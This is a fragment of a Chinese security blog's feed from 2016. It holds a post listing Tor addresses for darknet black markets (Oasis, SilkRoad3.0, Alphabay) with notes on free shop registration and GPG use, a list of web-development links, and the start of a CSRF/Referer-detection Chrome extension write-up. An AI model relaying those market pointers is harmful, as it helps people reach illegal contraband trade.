&lt;p&gt;&lt;a href=&quot;http://oasisnvwltxvmqqz.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;oasis&lt;/a&gt; 在tor非常有名的黑市，开店不要钱&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://reloadedudjtjvxr.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SilkRoad3.0&lt;/a&gt; SilkRoad3.0，不用多说，没有之前的 1.0、2.0好。开店要钱&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://pwoah7foa6au2pul.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Alphabay&lt;/a&gt; 应该是tor里最大的一家黑市了，开店免费&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;其他：&quot;&gt;&lt;a href=&quot;#其他：&quot; class=&quot;headerlink&quot; title=&quot;其他：&quot;&gt;&lt;/a&gt;&lt;code&gt;其他：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;在暗网上注册的时候，大多都需要GPG，比如上面的三个黑市，全部要求GPG密钥加密，在linux下有kgpg&lt;code&gt;sudo apt-get install kgpg&lt;/code&gt;，在windows上有&lt;code&gt;Gpg4win&lt;/code&gt;，而我之前所说的就是利用gpg来保存密码，gpg加密后的密文是这样：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-----BEGIN PGP MESSAGE-----&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Version: GnuPG v1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hQEMA1cgPhiOStPSAQf/c3TBvVq/tdciUYraeq83Fizrsx81l8BNqfGQ6wWh8EbI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9LjUQWOca5iz5nVrVOQYMcDI+/UqdWFIXf5cxPskTdpdIr0n5pbpwrcbcpIhvZly&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;GKZ88DZ4D6tpp4m3VDewUfi5+bS4ixuLHoRawC6HEq/7cnWqRWkIpPgBZsRrJuNH&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0CODKoQmwyR6FpmZk1/aXyfYnFI98QepfzbDgLidimnGbhX+U0GvULIxeTAZOp1G&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MtHvxDEZdwftKqUbyAqAU7K3Q3BK3wYfXI2GOYOpKNPhCUVHiCGwFsxWunFrRK1W&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4CpqZrYq79Ds7G2b9gztkf8+AJy5ElXr9IDNXnotktJIAUdWTzqNhuDPuSxYFUpS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90eXoXs6PH1E/+c4+D4Hm5Sb80x6V0l0Ubcm7lDk8S8ZrENskAE9YDLwqiImCKy6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c1zrRkSCTCcb&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;=7jiE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-----END PGP MESSAGE-----&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;破解需要密钥，和解密的密码，&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;最后更新时间-2016-8-20-13-40-21&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-20-13-40-21&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/20 13:40:21&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/20 13:40:21&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;a href=&quot;#利用暗网进行浏览onion的流程：&quot; class=&quot;headerlink&quot; title=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;/a&gt;&lt;code&gt;利用暗网进行浏览onion的流程：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章&lt;a href=&quot;http://www.chinagfw.org/2016/06/tor.html&quot;&gt;http://www.chinagfw.org/2016/06/tor.html&lt;/a&gt; (需要VPN或者lantern访问)&lt;/p&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>优秀的URL收集</title>
    <link href="http://bugs.cc/2016/08/15/%E4%BC%98%E7%A7%80%E7%9A%84URL%E6%94%B6%E9%9B%86/"/>
    <id>http://bugs.cc/2016/08/15/优秀的URL收集/</id>
    <published>2016-08-15T13:42:07.000Z</published>
    <updated>2016-08-15T14:54:15.370Z</updated>
    
    <content type="html">&lt;h3 id=&quot;最后更新时间-2016-8-15-22-40-48&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-15-22-40-48&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/15 22:40:48&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/15 22:40:48&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;UI美工：&quot;&gt;&lt;a href=&quot;#UI美工：&quot; class=&quot;headerlink&quot; title=&quot;UI美工：&quot;&gt;&lt;/a&gt;&lt;code&gt;UI美工：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;WEB安全色 ： &lt;a href=&quot;http://www.bootcss.com/p/websafecolors/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.bootcss.com/p/websafecolors/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;UI设计网  ： &lt;a href=&quot;http://www.uisheji.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.uisheji.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;阿里巴巴矢量图标库：&lt;a href=&quot;http://www.iconfont.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.iconfont.cn/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;前端开发-JavaScript-And-CSS-：&quot;&gt;&lt;a href=&quot;#前端开发-JavaScript-And-CSS-：&quot; class=&quot;headerlink&quot; title=&quot;前端开发(JavaScript And CSS)：&quot;&gt;&lt;/a&gt;&lt;code&gt;前端开发(JavaScript And CSS)：&lt;/code&gt;&lt;/h4&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;ICO font对比SVG font：&lt;a href=&quot;http://www.w3cplus.com/css3/icon-fonts-vs-svg.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.w3cplus.com/css3/icon-fonts-vs-svg.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前端冷知识：&lt;a href=&quot;http://www.cnblogs.com/Wayou/p/things_you_dont_know_about_frontend.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/Wayou/p/things_you_dont_know_about_frontend.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CSS简写法：&lt;a href=&quot;https://github.com/yisibl/blog/issues/4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/yisibl/blog/issues/4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;box-shadow秒懂：&lt;a href=&quot;http://codepen.io/yisi/pen/sDBwC&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://codepen.io/yisi/pen/sDBwC&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;图片延迟加载：&lt;a href=&quot;http://caibaojian.com/lazy-load.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://caibaojian.com/lazy-load.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;OurJS : &lt;a href=&quot;http://ourjs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ourjs.com/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;JavaScript：&quot;&gt;&lt;a href=&quot;#JavaScript：&quot; class=&quot;headerlink&quot; title=&quot;JavaScript：&quot;&gt;&lt;/a&gt;&lt;code&gt;JavaScript：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;微软官方的JavaScript语言参考：&lt;a href=&quot;https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94).aspx&lt;/a&gt;.aspx)&lt;/p&gt;
&lt;p&gt;深入剖析 JavaScript 的深复制：&lt;a href=&quot;http://jerryzou.com/posts/dive-into-deep-clone-in-javascript/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://jerryzou.com/posts/dive-into-deep-clone-in-javascript/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;function与感叹号：&lt;a href=&quot;http://swordair.com/function-and-exclamation-mark/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://swordair.com/function-and-exclamation-mark/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript的()()原理是什么：&lt;a href=&quot;http://segmentfault.com/q/1010000002897710&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000002897710&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Javascript如何实现接口？：&lt;a href=&quot;http://segmentfault.com/q/1010000002370889&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000002370889&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript回调函数怎么理解：&lt;a href=&quot;http://segmentfault.com/q/1010000000140970&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000000140970&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;function(){…})() 与 (function(){…}()) 有什么区别：&lt;a href=&quot;http://segmentfault.com/q/1010000000442042&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000000442042&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;详解JavaScript函数模式：&lt;a href=&quot;http://segmentfault.com/a/1190000000758184&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/a/1190000000758184&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;详解js闭包：&lt;a href=&quot;http://segmentfault.com/a/1190000000652891&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/a/1190000000652891&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript中的闭包：&lt;a href=&quot;http://segmentfault.com/a/1190000002805295&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/a/1190000002805295&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript性能优化小窍门：&lt;a href=&quot;http://ourjs.com/detail/54d9a6f2232227083e00002c&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ourjs.com/detail/54d9a6f2232227083e00002c&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;PHP：&quot;&gt;&lt;a href=&quot;#PHP：&quot; class=&quot;headerlink&quot; title=&quot;PHP：&quot;&gt;&lt;/a&gt;&lt;code&gt;PHP：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;php面向对象(OOP)编程完全教程：&lt;a href=&quot;http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/10/1823042.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/10/1823042.html&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;其他：&quot;&gt;&lt;a href=&quot;#其他：&quot; class=&quot;headerlink&quot; title=&quot;其他：&quot;&gt;&lt;/a&gt;&lt;code&gt;其他：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;在线的linux：&lt;a href=&quot;https://koding.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://koding.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jquery优秀插件：&lt;a href=&quot;http://www.jq22.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jq22.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在线工具合集：&lt;a href=&quot;http://tool.lu&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://tool.lu&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在线HTTP POST/GET接口测试工具：&lt;a href=&quot;http://www.atool.org/httptest.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.atool.org/httptest.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Google hosts：&lt;a href=&quot;https://laod.org/hosts/2016-google-hosts.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://laod.org/hosts/2016-google-hosts.html&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;最后更新时间-2016-8-15-22-40-48&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-15-22-40-48&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/15 22:40:48&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/15 22:40:48&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;UI美工：&quot;&gt;&lt;a href=&quot;#UI美工：&quot; class=&quot;headerlink&quot; title=&quot;UI美工：&quot;&gt;&lt;/a&gt;&lt;code&gt;UI美工：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;WEB安全色 ： &lt;a href=&quot;http://www.bootcss.com/p/websafecolors/&quot;&gt;http://www.bootcss.com/p/websafecolors/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;UI设计网  ： &lt;a href=&quot;http://www.uisheji.com/&quot;&gt;http://www.uisheji.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;阿里巴巴矢量图标库：&lt;a href=&quot;http://www.iconfont.cn/&quot;&gt;http://www.iconfont.cn/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;前端开发-JavaScript-And-CSS-：&quot;&gt;&lt;a href=&quot;#前端开发-JavaScript-And-CSS-：&quot; class=&quot;headerlink&quot; title=&quot;前端开发(JavaScript And CSS)：&quot;&gt;&lt;/a&gt;&lt;code&gt;前端开发(JavaScript And CSS)：&lt;/code&gt;&lt;/h4&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>自动化检测CSRF(第二篇)</title>
    <link href="http://bugs.cc/2016/06/23/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCSRF%EF%BC%88%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%89/"/>
    <id>http://bugs.cc/2016/06/23/自动化检测CSRF（第二章）/</id>
    <published>2016-06-23T15:49:34.000Z</published>
    <updated>2016-06-23T15:59:55.685Z</updated>
    
    <content type="html">&lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/24&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;产品&lt;/a&gt;(这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了=_=….)。而且这些是腾讯产品所没有的撒。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x01一些小的变化：&quot;&gt;&lt;a href=&quot;#0x01一些小的变化：&quot; class=&quot;headerlink&quot; title=&quot;0x01一些小的变化：&quot;&gt;&lt;/a&gt;0x01一些小的变化：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;之前的黑白名单列表&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];  &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对input验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;];   &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;现在的黑白名单列表：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;baidu.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;google.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;so.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;bing.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;soso.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;sogou.com&quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;此处的代码，决定了整体插件检测时的误报率大体走向。你也可以自己修改来达到自我感觉不错的地步。&lt;/p&gt;
&lt;p&gt;现在的初始化变量：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionCache,actionPath;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionvParameter = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ajaxParameter = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x02：插件的整体框架&quot;&gt;&lt;a href=&quot;#0x02：插件的整体框架&quot; class=&quot;headerlink&quot; title=&quot;0x02：插件的整体框架&quot;&gt;&lt;/a&gt;0x02：插件的整体框架&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;因为Maxthon浏览器的API实在是太少，没有这些API我无法进行Referer检测，于是，检测CSRF插件，就不写Maxthon的插件了，下面是Chrome插件的框架：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;icons 是存放插件图标的地方，我比较懒，直接使用AutoFindXSS插件的图标。&lt;/p&gt;
&lt;p&gt;background.html 是为了让我们修改插件的作用域，让我们可控，可以在Chrome的API中使用&lt;code&gt;jquery插件&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;background.js 这里我们把它理解为后端程序，类似于服务端的存在。用于处理&lt;code&gt;base.js&lt;/code&gt;文件的数据&lt;/p&gt;
&lt;p&gt;base.js 会在网站加载完成后调用。在&lt;code&gt;检测Referer&lt;/code&gt;的时候，把数据传给&lt;code&gt;background.js&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;manifest.json Chrome插件的核心文件，用于配置插件参数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我先给大家看一下manifest.json文件的内容：&lt;br&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;background&quot;&lt;/span&gt;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;page&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;background.html&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;persistent&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;AutoFindCSRF&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span 